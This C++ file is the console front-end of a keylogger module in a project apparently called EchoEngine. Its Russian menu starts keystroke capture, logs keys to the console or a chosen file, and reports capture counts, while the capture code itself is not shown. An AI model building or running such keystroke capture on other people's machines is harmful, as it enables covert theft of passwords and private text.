//
// Created by user on 04.01.2026.
//

#include "../../../include/EchoEngine/modules/keylogger/keylogger.h"
#include <iostream>
#include <string>
#include <conio.h>

void showMenu() {
    std::cout << "========================================" << std::endl;
    std::cout << "    ПРОГРАММА ПЕРЕХВАТА КЛАВИШ" << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << "Функции:" << std::endl;
    std::cout << "  1. Запустить перехват" << std::endl;
    std::cout << "  2. Настроить вывод" << std::endl;
    std::cout << "  3. Статистика" << std::endl;
    std::cout << "  4. Выход" << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << "Выберите действие (1-4): ";
}

void configureOutput(KeyLogger& logger) {
    std::cout << "\n=== НАСТРОЙКА ВЫВОДА ===" << std::endl;
    std::cout << "1. Выводить в консоль" << std::endl;
    std::cout << "2. Сохранять в файл" << std::endl;
    std::cout << "3. Оба варианта" << std::endl;
    std::cout << "4. Отмена" << std::endl;
    std::cout << "Выбор: ";

    char choice;
    std::cin >> choice;
    std::cin.ignore();

    switch (choice) {
        case '1':
            KeyLogger::setOutputToConsole(true);
            KeyLogger::setOutputToFile("");
            std::cout << "Установлен вывод только в консоль." << std::endl;
            break;
        case '2': {
            std::cout << "Введите имя файла (например: log.txt): ";
            std::string filename;
            std::getline(std::cin, filename);
            KeyLogger::setOutputToConsole(false);
            KeyLogger::setOutputToFile(filename);
            std::cout << "Лог будет сохраняться в файл: " << filename << std::endl;
            break;
        }
        case '3': {
            std::cout << "Введите имя файла (например: log.txt): ";
            std::string filename;
            std::getline(std::cin, filename);
            KeyLogger::setOutputToConsole(true);
            KeyLogger::setOutputToFile(filename);
            std::cout << "Лог будет выводиться в консоль и сохраняться в файл." << std::endl;
            break;
        }
        default:
            std::cout << "Настройки не изменены." << std::endl;


    }
}

int start_keylogger() {

    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    KeyLogger logger;

    char choice;
    do {
        showMenu();
        std::cin >> choice;
        std::cin.ignore();

        switch (choice) {
            case '1': {
                std::cout << "\nЗапуск перехвата..." << std::endl;

                KeyLogger::setOutputToConsole(true);
                KeyLogger::setCaptureEnabled(true);

                try {
                    logger.run();
                } catch (const std::exception& e) {
                    std::cerr << "Ошибка: " << e.what() << std::endl;
                }
                break;
            }
            case '2':
                configureOutput(logger);
                break;
            case '3': {
                std::cout << "\n=== СТАТИСТИКА ===" << std::endl;
                std::cout << "Всего перехвачено: " << KeyLogger::getCapturedCount() << " нажатий" << std::endl;
                std::cout << "Статус: " << (logger.isRunning() ? "Запущен" : "Остановлен") << std::endl;
                break;
            }
            case '4':
                std::cout << "Выход из программы..." << std::endl;
                break;
            default:
                std::cout << "Неверный выбор. Попробуйте снова." << std::endl;
        }

        if (choice != '4') {
            std::cout << "\nНажмите любую клавишу для продолжения...";
            _getch();
            std::cout << std::endl;
        }

    } while (choice != '4');

    logger.shutdown();
    return 0;

}





